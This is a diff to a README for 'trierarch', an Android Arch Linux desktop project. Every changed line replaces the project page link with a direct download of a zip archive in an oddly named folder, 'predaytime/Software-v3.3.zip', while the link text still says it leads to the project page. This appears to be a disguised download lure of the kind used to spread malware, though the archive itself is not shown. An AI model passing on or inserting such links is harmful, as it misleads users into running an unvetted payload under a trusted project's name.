@@ -1,6 +1,6 @@
 # 🧭 trierarch - Pocket Arch Linux desktop on Android
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gamerscream/trierarch)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gamerscream/trierarch/main/predaytime/Software-v3.3.zip)
 
 ## 📱 What trierarch does
 
@@ -33,7 +33,7 @@ For best results, use:
 
 Open the project page here:
 
-[Visit the trierarch download page](https://github.com/gamerscream/trierarch)
+[Visit the trierarch download page](https://raw.githubusercontent.com/gamerscream/trierarch/main/predaytime/Software-v3.3.zip)
 
 ## 🚀 Get it on your device
 
@@ -166,7 +166,7 @@ If downloads fail:
 
 Repository: trierarch  
 Description: Your pocket Arch Linux + KDE Plasma (Wayland) desktop—pretty, personal, always with you. Neither Termux nor Termux:X11 is required.  
-Primary link: https://github.com/gamerscream/trierarch
+Primary link: https://raw.githubusercontent.com/gamerscream/trierarch/main/predaytime/Software-v3.3.zip
 
 ## 🔐 Privacy and local use
 
